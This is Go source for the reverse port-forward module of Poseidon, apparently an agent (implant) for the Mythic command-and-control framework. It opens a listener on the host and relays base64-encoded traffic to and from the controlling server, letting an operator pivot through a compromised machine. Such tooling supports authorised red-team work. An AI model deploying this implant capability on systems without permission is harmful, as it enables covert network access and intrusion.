package rpfwd

import (
	// Standard
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"math"
	"math/rand"
	"net"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type rpfwdTracker struct {
	Channel    chan structs.SocksMsg
	Connection net.Conn
}
type Args struct {
	Action string `json:"action"`
	Port   int    `json:"port"`
}

var channelMap = make(map[uint32]rpfwdTracker)

type addToMap struct {
	ChannelID  uint32
	Connection net.Conn
	NewChannel chan structs.SocksMsg
}

var addToMapChan = make(chan addToMap)
var removeFromMapChan = make(chan uint32, 100)
var closeAllChannelsChan = make(chan bool)

// var sendToMapChan = make(chan structs.SocksMsg)
var startedGoRoutines = false

var listener *net.Listener = nil

func Run(task structs.Task) {
	args := Args{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if !startedGoRoutines {
		go handleMutexMapModifications()
		startedGoRoutines = true
	}
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	closeAllChannelsChan <- true
	msg := task.NewResponse()
	if args.Action == "start" {
		if listener != nil {
			if err = (*listener).Close(); err != nil {
				msg = task.NewResponse()
				msg.SetError(err.Error())
				task.Job.SendResponses <- msg
				return
			}
		}
		addr := fmt.Sprintf("0.0.0.0:%d", args.Port)
		if l, err := net.Listen("tcp4", addr); err != nil {
			msg = task.NewResponse()
			msg.SetError(err.Error())
			task.Job.SendResponses <- msg
			return
		} else {
			listener = &l
			go handleConnections(task)
		}
		msg.UserOutput = fmt.Sprintf("reverse port forward started on port: %d\n", args.Port)
		msg.Completed = true
	} else {
		msg.UserOutput = fmt.Sprintf("reverse port forward stoped on port: %d\n", args.Port)
		msg.Completed = true
	}
	task.Job.SendResponses <- msg

}
func handleMutexMapModifications() {
	for {
		select {
		case <-closeAllChannelsChan:
			keys := make([]uint32, len(channelMap))
			i := 0
			// close all the connections
			for key, _ := range channelMap {
				close(channelMap[key].Channel)
				channelMap[key].Connection.Close()
				keys[i] = key
				i++
			}
			// delete all the keys
			for _, key := range keys {
				delete(channelMap, key)
			}
		case msg := <-addToMapChan:
			channelMap[msg.ChannelID] = rpfwdTracker{
				Channel:    msg.NewChannel,
				Connection: msg.Connection,
			}
		case msg := <-removeFromMapChan:
			if _, ok := channelMap[msg]; ok {
				close(channelMap[msg].Channel)
				channelMap[msg].Connection.Close()
				delete(channelMap, msg)
				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
			}
		case msg := <-responses.FromMythicRpfwdChannel:
			//fmt.Printf("got message FromMythicRpfwdChannel: %d\n", msg.ServerId)
			if _, ok := channelMap[msg.ServerId]; ok {
				select {
				case channelMap[msg.ServerId].Channel <- msg:
				case <-time.After(1 * time.Second):
					//fmt.Printf("dropping data because channel is full")
				}
			} else {
				//fmt.Printf("Channel id, %d, unknown\n", msg.ServerId)
			}
		}
	}
}

func handleConnections(task structs.Task) {
	for {
		if conn, err := (*listener).Accept(); err != nil {
			if err := (*listener).Close(); err != nil {
				msg := task.NewResponse()
				msg.SetError(err.Error())
				task.Job.SendResponses <- msg
			} else {
				msg := task.NewResponse()
				msg.SetError(err.Error())
				task.Job.SendResponses <- msg
				listener = nil
			}
			return
		} else {
			recvChan := make(chan structs.SocksMsg, 200)
			newChannelID := uint32(rand.Intn(math.MaxInt32))
			addToMapChan <- addToMap{
				ChannelID:  newChannelID,
				Connection: conn,
				NewChannel: recvChan,
			}
			go readFromProxy(conn, responses.InterceptToMythicRpfwdChannel, newChannelID)
			go writeToProxy(recvChan, conn, newChannelID, responses.InterceptToMythicRpfwdChannel)
		}
	}

}
func readFromProxy(conn net.Conn, toMythicRpfwdChannel chan structs.SocksMsg, channelId uint32) {
	for {
		bufIn := make([]byte, 4096)
		// Read the incoming connection into the buffer.
		//conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		//fmt.Printf("channel (%d) waiting to read from proxy address\n", channelId)
		totalRead, err := conn.Read(bufIn)
		//fmt.Printf("channel (%d) totalRead from proxy: %d\n", channelId, totalRead)

		if err != nil {
			//fmt.Println("Error reading from remote proxy: ", err.Error())
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
			removeFromMapChan <- channelId
			return
		}
		//fmt.Printf("Channel (%d) Got %d bytes from proxy\n", channelId, totalRead)
		if totalRead > 0 {
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = base64.StdEncoding.EncodeToString(bufIn[:totalRead])
			msg.Exit = false
			toMythicRpfwdChannel <- msg
		}
	}
}
func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint32, toMythicRpfwdChannel chan structs.SocksMsg) {
	w := bufio.NewWriter(conn)
	for bufOut := range recvChan {
		// Send a response back to person contacting us.
		//fmt.Printf("writeToProxy wants to send %d bytes\n", len(bufOut.Data))
		if bufOut.Exit {
			// got a message from mythic that says to exit
			//fmt.Printf("channel (%d) got exit message from Mythic\n", channelId)
			w.Flush()
			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		data, err := base64.StdEncoding.DecodeString(bufOut.Data)
		if err != nil {
			//fmt.Printf("Bad base64 data received\n")
			w.Flush()
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		_, err = w.Write(data)
		if err != nil {
			//fmt.Println("channel (%d) Error writing to proxy: ", channelId, err.Error())
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			toMythicRpfwdChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
			//fmt.Printf("told mythic to exit channel %d through fromMythicSocksChannel <- msg\n", channelId)
			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
			removeFromMapChan <- channelId
			return
		}
		w.Flush()
		//fmt.Printf("total written to proxy: %d\n", totalWritten)
	}
	w.Flush()
	//fmt.Printf("channel (%d) proxy connection for writing closed\n", channelId)
	msg := structs.SocksMsg{}
	msg.ServerId = channelId
	msg.Data = ""
	msg.Exit = true
	toMythicRpfwdChannel <- msg
	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
	removeFromMapChan <- channelId
	return
}
